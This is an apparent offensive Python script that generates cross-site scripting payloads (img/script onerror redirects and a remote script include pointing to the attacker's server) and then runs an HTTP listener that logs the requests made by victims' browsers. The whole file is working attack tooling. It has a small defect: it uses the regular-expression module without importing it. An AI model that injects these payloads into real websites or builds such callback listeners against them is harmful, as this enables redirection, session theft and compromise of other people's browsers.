#!/usr/bin/env python

from hackingscripts import util
from fileserver import HttpFileServer
import argparse
import random

def generate_payload(payload_type, url, index=None, **kwargs):
    payloads = []

    media_tags = ["img","audio","video","image","body","script","object"]
    if payload_type in media_tags:
        payloads.append('<%s src=1 href=1 onerror="javascript:document.location=%s">' % (payload_type, url))

    if payload_type == "script":
        payloads.append('<script type="text/javascript">document.location=%s</script>' % url)
        payloads.append('<script src="%s/xss" />' % url)

    if len(payloads) == 0:
        return None

    return "\n".join(payloads)

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="XSS payload generator")
    parser.add_argument(dest="type", type=str, default=None, help="Payload type")
    parser.add_argument("-p", "--port", type=int, required=False, default=None, help="Listening port")
    parser.add_argument("-a", "--addr", type=str, required=False, default=util.get_address(), help="Listening address")
    args, extra = parser.parse_known_args()

    listen_port = args.port
    payload_type = args.type.lower()
    local_address = args.addr
    extra_args = {}

    for entry in extra:
        match = re.match(r"(\w+)=(\w+)", entry)
        if not match:
            print("Invalid extra argument:", entry)
            exit()
        key, value = match.groups()
        extra_args[key] = value

    # choose random port
    if listen_port is None:
        listen_port = random.randint(10000,65535)
        while util.is_port_in_use(listen_port):
            listen_port = random.randint(10000,65535)

    http_server = HttpFileServer(local_address, listen_port)
    payload_type = args.type.lower()
    url = http_server.get_full_url("/", util.get_address())
    payload = generate_payload(payload_type, url, **extra_args)
    if payload is None:
        print("Unknown payload type: %s" % payload_type)
        # print("Supported types: ")
        exit(1)

    print(f"---PAYLOAD---\n{payload}\n---PAYLOAD---\n")

    headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS"
    }

    http_server.addRoute("/", lambda req: (201, b"", headers))
    http_server.dumpRequest("/")
    http_server.serve_forever()
    
    
